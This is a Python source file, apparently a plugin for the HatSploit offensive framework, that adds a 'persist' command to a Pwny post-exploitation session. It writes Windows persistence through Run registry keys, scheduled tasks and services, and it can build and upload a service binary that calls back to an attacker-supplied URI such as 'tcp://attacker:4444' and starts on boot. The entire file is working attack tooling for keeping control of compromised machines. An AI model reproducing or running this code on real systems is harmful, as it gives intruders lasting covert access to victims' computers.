"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import os
import tempfile

from pwny import Pwny
from pwny.api import *
from pwny.types import *

from badges.cmd import Command
from hatsploit.lib.core.plugin import Plugin


PERSIST_INSTALL = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)
PERSIST_REMOVE = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 1)
PERSIST_LIST = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 2)

TLV_TYPE_PERSIST_TYPE = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE)
TLV_TYPE_PERSIST_NAME = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
TLV_TYPE_PERSIST_CMD = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
TLV_TYPE_PERSIST_GROUP = tlv_custom_type(TLV_TYPE_GROUP, TAB_BASE, API_TYPE)

PERSIST_REGISTRY_HKCU = 1
PERSIST_REGISTRY_HKLM = 2
PERSIST_SCHTASK = 3
PERSIST_SERVICE = 4

TECHNIQUE_MAP = {
    'reg_hkcu': PERSIST_REGISTRY_HKCU,
    'reg_hklm': PERSIST_REGISTRY_HKLM,
    'schtask': PERSIST_SCHTASK,
    'service': PERSIST_SERVICE,
}

TECHNIQUE_NAMES = {
    PERSIST_REGISTRY_HKCU: 'HKCU Run Key',
    PERSIST_REGISTRY_HKLM: 'HKLM Run Key',
    PERSIST_SCHTASK: 'Scheduled Task',
    PERSIST_SERVICE: 'Windows Service',
}


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Persist Plugin",
            'Plugin': "persist",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "Install/remove/list persistence mechanisms.",
        })

        self.commands = [
            Command({
                'Category': "manage",
                'Name': "persist",
                'Description': "Install/remove/list persistence mechanisms.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-i', '--install'),
                        {
                            'help': "Install persistence (reg_hkcu, reg_hklm, schtask, service).",
                            'metavar': 'TYPE',
                            'choices': list(TECHNIQUE_MAP.keys()),
                        }
                    ),
                    (
                        ('-r', '--remove'),
                        {
                            'help': "Remove persistence (reg_hkcu, reg_hklm, schtask, service).",
                            'metavar': 'TYPE',
                            'choices': list(TECHNIQUE_MAP.keys()),
                        }
                    ),
                    (
                        ('-l', '--list'),
                        {
                            'help': "List current Run key entries.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-n', '--name'),
                        {
                            'help': "Name for the persistence entry.",
                            'metavar': 'NAME',
                        }
                    ),
                    (
                        ('-c', '--cmd'),
                        {
                            'help': "Command/path to execute on persistence trigger.",
                            'metavar': 'CMD',
                        }
                    ),
                    (
                        ('-d', '--deploy'),
                        {
                            'help': "Deploy precompiled Pwny service binary to target "
                                    "(use with --install service).",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-u', '--uri'),
                        {
                            'help': "Callback URI for deployed service "
                                    "(e.g. tcp://attacker:4444).",
                            'metavar': 'URI',
                        }
                    ),
                    (
                        ('-p', '--remote-path'),
                        {
                            'help': "Remote path to upload service binary to "
                                    "(default: C:\\Windows\\System32\\<name>.exe).",
                            'metavar': 'PATH',
                        }
                    ),
                ]
            })
        ]

    def deploy_service(self, name, uri, remote_path=None):
        target = self.session.details.get('Arch')

        if target is None:
            self.print_error("Unable to determine target architecture!")
            return False

        self.print_process(
            f"Building service binary for {target.triplet}..."
        )

        binary = Pwny(
            target=target.triplet,
            options={'uri': uri},
        ).to_binary('service')

        if not binary:
            self.print_error(
                "Service binary template not found for target! "
                "Ensure the service binary is built and placed in "
                "pwny/templates/ as <target>.service"
            )
            return False

        if not remote_path:
            remote_path = f"C:\\Windows\\System32\\{name}.exe"

        self.print_process(
            f"Uploading service binary ({len(binary)} bytes) "
            f"to {remote_path}..."
        )

        tmp = None
        try:
            tmp = tempfile.NamedTemporaryFile(
                suffix='.exe', delete=False
            )
            tmp.write(binary)
            tmp.close()

            self.session.upload(tmp.name, remote_path)

        except Exception as e:
            self.print_error(f"Failed to upload service binary: {e}")
            return False

        finally:
            if tmp and os.path.exists(tmp.name):
                os.unlink(tmp.name)

        self.print_process(
            f"Registering service '{name}' -> {remote_path}..."
        )

        result = self.session.send_command(
            tag=PERSIST_INSTALL,
            plugin=self.plugin,
            args={
                TLV_TYPE_PERSIST_TYPE: PERSIST_SERVICE,
                TLV_TYPE_PERSIST_NAME: name,
                TLV_TYPE_PERSIST_CMD: remote_path,
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(
                "Failed to register service! "
                "May require elevated privileges (run as SYSTEM/Admin)."
            )
            return False

        self.print_success(
            f"Service '{name}' deployed and registered successfully!\n"
            f"  Binary : {remote_path}\n"
            f"  URI    : {uri}\n"
            f"  Start  : SERVICE_AUTO_START (starts on boot)"
        )
        return True

    def persist(self, args):
        if args.list:
            result = self.session.send_command(
                tag=PERSIST_LIST, plugin=self.plugin
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to list persistence entries!")
                return

            data = []
            entry = result.get_tlv(TLV_TYPE_PERSIST_GROUP)

            while entry:
                ptype = entry.get_int(TLV_TYPE_PERSIST_TYPE) or 0
                name_raw = entry.get_raw(TLV_TYPE_PERSIST_NAME)
                cmd_raw = entry.get_raw(TLV_TYPE_PERSIST_CMD)

                name = name_raw.decode('utf-8', errors='replace') if name_raw else ''
                cmd = cmd_raw.decode('utf-8', errors='replace') if cmd_raw else ''
                type_name = TECHNIQUE_NAMES.get(ptype, 'Unknown')

                data.append((type_name, name, cmd))
                entry = result.get_tlv(TLV_TYPE_PERSIST_GROUP)

            if not data:
                self.print_warning("No Run key entries found.")
                return

            self.print_table("Persistence Entries",
                             ('Type', 'Name', 'Command'), *data)

        elif args.install:
            if args.deploy:
                if args.install != 'service':
                    self.print_error("--deploy can only be used with --install service")
                    return

                if not args.name:
                    self.print_error("Deploy requires -n/--name")
                    return

                if not args.uri:
                    self.print_error(
                        "Deploy requires -u/--uri (e.g. tcp://attacker:4444)"
                    )
                    return

                self.deploy_service(
                    args.name,
                    args.uri,
                    remote_path=getattr(args, 'remote_path', None),
                )
                return

            if not args.name or not args.cmd:
                self.print_error("Install requires -n/--name and -c/--cmd")
                return

            technique = TECHNIQUE_MAP.get(args.install)
            type_name = TECHNIQUE_NAMES.get(technique, args.install)

            self.print_process(
                f"Installing persistence via {type_name}: {args.name}..."
            )

            result = self.session.send_command(
                tag=PERSIST_INSTALL,
                plugin=self.plugin,
                args={
                    TLV_TYPE_PERSIST_TYPE: technique,
                    TLV_TYPE_PERSIST_NAME: args.name,
                    TLV_TYPE_PERSIST_CMD: args.cmd,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(
                    f"Failed to install persistence! "
                    f"May require elevated privileges."
                )
                return

            self.print_success(f"Persistence installed via {type_name}.")

        elif args.remove:
            if not args.name:
                self.print_error("Remove requires -n/--name")
                return

            technique = TECHNIQUE_MAP.get(args.remove)
            type_name = TECHNIQUE_NAMES.get(technique, args.remove)

            self.print_process(f"Removing persistence: {args.name}...")

            result = self.session.send_command(
                tag=PERSIST_REMOVE,
                plugin=self.plugin,
                args={
                    TLV_TYPE_PERSIST_TYPE: technique,
                    TLV_TYPE_PERSIST_NAME: args.name,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to remove persistence entry!")
                return

            self.print_success(f"Persistence entry '{args.name}' removed.")

        else:
            self.print_usage()

    def load(self):
        pass
